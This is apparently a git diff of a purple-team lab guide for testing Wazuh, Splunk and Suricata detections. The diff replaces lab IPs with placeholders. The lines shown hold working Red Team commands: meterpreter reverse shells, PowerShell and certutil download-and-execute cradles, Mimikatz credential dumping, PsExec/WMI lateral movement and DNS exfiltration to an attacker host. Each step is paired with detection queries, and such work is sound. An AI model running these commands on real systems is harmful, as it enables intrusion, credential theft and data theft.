@@ -8,10 +8,12 @@ This document provides step-by-step Red Team commands and Blue Team validation c
 ## Lab Environment
 | Component | IP Range | Role |
 |-----------|----------|------|
-| Windows Target | 10.0.1.10/24 | Victim Endpoint (Sysmon + Wazuh Agent) |
-| VM1 (Wazuh + n8n) | 10.0.2.4/24 | Tier 1 SIEM/SOAR |
-| VM2 (Splunk + Suricata) | 10.0.2.5/24 | Tier 2 Analytics/NIDS |
-| Attacker | 10.0.3.5/24 | Metasploit/C2 Framework |
+| Windows Target | <WINDOWS_TARGET_IP>/24 | Victim Endpoint (Sysmon + Wazuh Agent) |
+| VM1 (Wazuh + n8n) | <VM1_IP>/24 | Tier 1 SIEM/SOAR |
+| VM2 (Splunk + Suricata) | <VM2_IP>/24 | Tier 2 Analytics/NIDS |
+| Attacker | <ATTACKER_IP>/24 | Metasploit/C2 Framework |
+
+> **Note:** Replace `<WINDOWS_TARGET_IP>`, `<VM1_IP>`, `<VM2_IP>`, `<ATTACKER_IP>` with your actual lab IPs. Configure these in your `.env` file and Metasploit resource script.
 
 ---
 
@@ -27,7 +29,7 @@ msfconsole -r metasploit_c2.rc
 
 # Generate payload
 use payload/windows/x64/meterpreter/reverse_tcp
-set LHOST 10.0.3.5
+set LHOST <ATTACKER_IP>
 set LPORT 4444
 generate -f exe -o /tmp/payload.exe
 
@@ -35,13 +37,13 @@ generate -f exe -o /tmp/payload.exe
 use exploit/multi/script/web_delivery
 set target 2
 set payload windows/x64/meterpreter/reverse_tcp
-set SRVHOST 10.0.3.5
+set SRVHOST <ATTACKER_IP>
 set SRVPORT 8080
 set URIPATH /payload
 run -j
 
 # On Target (simulate user click)
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:8080/payload')"
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8080/payload')"
 ```
 
 #### Blue Team Validation
@@ -49,7 +51,7 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:80
 ```bash
 # Query Wazuh API for Sysmon Event ID 1 (Process Creation)
 curl -k -u wazuh:${WAZUH_PASSWORD} \
-  "https://10.0.2.4:55000/alerts?rule.groups=sysmon&winlog.event_id=1&limit=10"
+  "https://<VM1_IP>:55000/alerts?rule.groups=sysmon&winlog.event_id=1&limit=10"
 
 # Expected Rule IDs: 100001-100008 (LOLBin detection)
 # Expected MITRE: T1059.001, T1105, T1218.x
@@ -71,13 +73,13 @@ index=main sourcetype=wazuh_json rule.level>=10 winlog.event_id=1
 #### Red Team Commands
 ```powershell
 # On Target - Encoded PowerShell command
-$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:8080/payload')"
+$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8080/payload')"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 $encoded = [Convert]::ToBase64String($bytes)
 powershell -EncodedCommand $encoded
 
 # Alternative: Direct download and execute
-certutil -urlcache -split -f http://10.0.3.5:8080/payload.exe C:\Temp\payload.exe
+certutil -urlcache -split -f http://<ATTACKER_IP>:8080/payload.exe C:\Temp\payload.exe
 C:\Temp\payload.exe
 ```
 
@@ -125,7 +127,7 @@ Invoke-Mimikatz -DumpCreds
 ```bash
 # Wazuh API - Critical LSASS alerts
 curl -k -u wazuh:${WAZUH_PASSWORD} \
-  "https://10.0.2.4:55000/alerts?rule.level=12&rule.groups=sysmon&limit=20"
+  "https://<VM1_IP>:55000/alerts?rule.level=12&rule.groups=sysmon&limit=20"
 
 # Expected: rule.id 100030/100031 with granted_access 0x1010 or 0x1F0FFF
 ```
@@ -216,16 +218,16 @@ index=main sourcetype=wazuh_json win.eventdata.targetobject="*Windows Defender*"
 ```bash
 # On Attacker - PsExec
 use exploit/windows/smb/psexec
-set RHOSTS 10.0.1.10
+set RHOSTS <WINDOWS_TARGET_IP>
 set SMBUser administrator
 set SMBPass <password_or_hash>
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 10.0.3.5
+set LHOST <ATTACKER_IP>
 run
 
 # WMI
 use exploit/windows/wmi/wmi_exec
-set RHOSTS 10.0.1.10
+set RHOSTS <WINDOWS_TARGET_IP>
 set SMBUser administrator
 set SMBPass <password_or_hash>
 run
@@ -305,7 +307,7 @@ Compress-Archive -Path C:\Temp\staging\* -DestinationPath C:\Temp\exfil.zip
 # meterpreter > upload C:\Temp\exfil.zip /tmp/
 
 # Alternative: DNS Exfiltration (detected by Suricata 2000020)
-powershell -c "$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\exfil.zip')); $parts = $data -split '(.{200})' | ?{$_}; foreach($p in $parts) {Resolve-DnsName -Name \"$p.exfil.attacker.com\" -Server 10.0.3.5}"
+powershell -c "$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\exfil.zip')); $parts = $data -split '(.{200})' | ?{$_}; foreach($p in $parts) {Resolve-DnsName -Name \"$p.exfil.attacker.com\" -Server <ATTACKER_IP>}"
 ```
 
 #### Blue Team Validation
